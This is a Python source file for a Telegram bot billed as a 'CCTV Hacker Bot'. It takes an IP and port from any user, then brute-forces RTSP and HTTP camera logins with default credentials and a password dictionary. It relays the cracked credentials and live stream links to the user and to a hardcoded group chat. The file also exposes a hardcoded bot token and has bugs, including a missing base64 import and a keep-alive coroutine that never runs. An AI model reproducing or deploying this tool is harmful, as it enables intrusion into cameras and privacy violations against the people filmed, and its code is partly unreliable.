```python
import os
import asyncio
import socket
import logging
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT = range(2)

# Common CCTV credentials dictionary
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Small dictionary for brute-forcing (lightweight for Koyeb)
PASSWORD_DICT = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666",
    "password123", "adminadmin", "root", "qwerty", "letmein", "welcome",
    "camera", "security", "000000", "111111", "123123", "abc123", "pass123"
]

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and ask for IP address."""
    await update.message.reply_text(
        "Welcome to CCTV Hacker Bot! 🎥\nPlease enter the IP address to hack:"
    )
    return IP

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Store IP and ask for port."""
    context.user_data["ip"] = update.message.text
    await update.message.reply_text("Got the IP! Now enter the port number (e.g., 80, 554):")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process IP and port, perform hack, and send results."""
    ip = context.user_data.get("ip")
    port = update.message.text

    try:
        port = int(port)
    except ValueError:
        await update.message.reply_text("Invalid port number! Please enter a number.")
        return PORT

    # Perform the hack
    results = await hack_cctv(ip, port)

    # Send results to user
    await update.message.reply_text(results)

    # Send results to group chat
    try:
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"Hack Results for {ip}:{port}\n\n{results}")
    except Exception as e:
        logger.error(f"Error sending to group: {e}")

    return ConversationHandler.END

async def hack_cctv(ip: str, port: int) -> str:
    """Perform CCTV hacking with RTSP login validation and password cracking."""
    results = [f"📡 Scanning {ip}:{port}..."]

    # Check if port is open
    if not await check_port(ip, port):
        results.append("❌ Port closed or unreachable.")
        return "\n".join(results)

    results.append("✅ Port open!")

    # Detect service
    service = "unknown"
    if port in [80, 8080, 8000, 8443]:
        service = "http"
    elif port == 554:
        service = "rtsp"
    results.append(f"Service: {service}")

    # Try to detect camera model via HTTP (if port supports HTTP)
    camera_model = "Unable to detect"
    if service == "http":
        try:
            async with ClientSession() as session:
                async with session.get(f"http://{ip}:{port}", timeout=5) as response:
                    if response.status == 200:
                        html = await response.text()
                        if "hikvision" in html.lower():
                            camera_model = "Hikvision"
                        elif "dahua" in html.lower():
                            camera_model = "Dahua"
        except Exception as e:
            camera_model = f"Unable to detect (error: {str(e)})"

    results.append(f"Camera Model: {camera_model}")

    # RTSP brute-force and validation
    rtsp_results = []
    live_links = []
    if service == "rtsp":
        # Test default credentials
        for username, password in CREDENTIALS:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            is_valid, error = await validate_rtsp(ip, port, username, password)
            if is_valid:
                rtsp_results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
                live_links.append(rtsp_url)
            else:
                rtsp_results.append(f"❌ RTSP Error: {username}:{password} ({error})")

        # If no default creds work, try dictionary attack
        if not live_links:
            results.append("⚠️ No default creds worked. Attempting dictionary attack...")
            for password in PASSWORD_DICT:
                rtsp_url = f"rtsp://admin:{password}@{ip}:{port}/live"
                is_valid, error = await validate_rtsp(ip, port, "admin", password)
                if is_valid:
                    rtsp_results.append(f"✅ RTSP Success: admin:{password} (try {rtsp_url})")
                    live_links.append(rtsp_url)
                    break  # Stop after first success to save resources
                else:
                    rtsp_results.append(f"❌ RTSP Error: admin:{password} ({error})")

        # Try no-creds URL
        no_creds_url = f"rtsp://{ip}:{port}/live"
        is_valid, error = await validate_rtsp(ip, port, "", "")
        if is_valid:
            rtsp_results.append(f"✅ RTSP Success: No credentials (try {no_creds_url})")
            live_links.append(no_creds_url)
        else:
            rtsp_results.append(f"❌ RTSP Error: No credentials ({error})")

    results.extend(rtsp_results)

    # HTTP brute-force (if applicable)
    http_results = []
    if service == "http":
        paths = ["/login", "/admin", "/signin", "/"]
        for username, password in CREDENTIALS:
            for path in paths:
                try:
                    async with ClientSession() as session:
                        async with session.post(
                            f"http://{ip}:{port}{path}",
                            data={"username": username, "password": password},
                            timeout=5
                        ) as response:
                            if response.status == 200:
                                http_results.append(
                                    f"✅ HTTP Success: {username}:{password} on {path} "
                                    f"(try http://{ip}:{port}{path})"
                                )
                            else:
                                http_results.append(
                                    f"❌ HTTP Error: {username}:{password} on {path} "
                                    f"(status: {response.status})"
                                )
                except Exception as e:
                    http_results.append(
                        f"❌ HTTP Error: {username}:{password} on {path} (error: {str(e)})"
                    )

    results.extend(http_results)

    # ONVIF check
    onvif_result = "Unable to detect ONVIF"
    try:
        async with ClientSession() as session:
            async with session.get(f"http://{ip}:{port}/onvif/device_service", timeout=5) as response:
                if response.status == 200:
                    onvif_result = "✅ ONVIF Detected"
    except Exception:
        pass
    results.append(f"ONVIF: {onvif_result}")

    # Vulnerability note
    if live_links:
        results.append(
            "⚠️ Vulnerability: RTSP port open. Unsecured streams may allow unauthorized video access. "
            "Secure with authentication."
        )

    # Final result
    if live_links:
        results.append(f"🎉 Hack Successful! Access CCTV via these live links:\n" + "\n".join(live_links))
    else:
        results.append("❌ Hack Failed: No live streams found. Try another port or IP.")

    return "\n".join(results)

async def check_port(ip: str, port: int) -> bool:
    """Check if a port is open using socket."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    """Validate RTSP credentials by sending a DESCRIBE request."""
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        # Construct RTSP DESCRIBE request
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\n"
        request += f"CSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        
        # Send request
        writer.write(request.encode('ascii'))
        await writer.drain()

        # Read response
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        response_str = response.decode('ascii', errors='ignore')

        # Check for 200 OK
        if "RTSP/1.0 200 OK" in response_str:
            writer.close()
            await writer.wait_closed()
            return True, "Success"
        elif "401 Unauthorized" in response_str:
            writer.close()
            await writer.wait_closed()
            return False, "Authentication failed"
        else:
            writer.close()
            await writer.wait_closed()
            return False, f"Unexpected response: {response_str[:50]}"

    except asyncio.TimeoutError:
        return False, "Connection timeout"
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text("Hack cancelled. Use /start to try again.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check bot status."""
    await update.message.reply_text("Bot is running! Use /start to hack a CCTV.")

async def keep_alive():
    """Keep-alive server to prevent Koyeb from shutting down."""
    import http.server
    import socketserver

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()

    with socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler) as httpd:
        logger.info(f"Keep-alive server running on port {KEEP_ALIVE_PORT}")
        httpd.serve_forever()

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, ip)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status))

    # Start keep-alive server in a separate thread
    import threading
    threading.Thread(target=keep_alive, daemon=True).start()

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
```